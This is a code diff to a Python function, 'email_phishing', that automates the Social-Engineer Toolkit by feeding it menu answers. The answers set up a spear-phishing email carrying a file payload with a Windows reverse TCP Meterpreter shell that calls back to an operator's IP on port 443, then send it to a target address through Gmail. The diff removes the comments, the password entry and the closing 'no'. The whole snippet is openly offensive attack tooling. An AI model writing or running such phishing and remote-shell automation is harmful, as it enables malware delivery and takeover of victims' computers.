@@ -15,27 +15,26 @@ def email_phishing():
     filename = input("What should the file be called?: ")
 
     commands = [
-        "1\n",  # Social-Engineering Attacks
-        "1\n",  # Spear-Phishing Attack Vectors
-        "1\n",  # Perform a Mass Email Attack
-        "13\n",  # Create a FileFormat Payload
-        "2\n",  # Windows Reverse_TCP Meterpreter
-        "1\n",  # Windows Reverse_TCP Meterpreter
-        f"{ip}\n",  # IP Address
-        "443\n",  # Port
-        "2\n",  # Create a Payload and Listener
-        f"{filename}\n",  # Payload name
-        "1\n",  # Use a built-in email attack
-        "1\n",  # Single Email Address
-        "3\n",  # GMail
-        f"{targetmail}\n",  # Target email
-        "1\n",  # Send email
-        f"{mail}\n",  # Your email
-        "test\n",  # Email subject
-        f"{password}\n",  # Email password
-        "yes\n",  # Send email
-        "yes\n",  # Are you sure?
-        "no\n"   # Do you want to send another email?
+        "1\n",
+        "1\n",
+        "1\n",
+        "13\n",
+        "2\n",
+        "1\n",
+        f"{ip}\n",
+        "443\n",
+        "2\n",
+        f"{filename}\n",
+        "1\n",
+        "1\n",
+        "3\n",
+        f"{targetmail}\n",
+        "1\n",
+        f"{mail}\n",
+        "test\n",
+        "yes\n",
+        "yes\n",
+        "yes\n"
     ]
     
     run_setoolkit(commands)
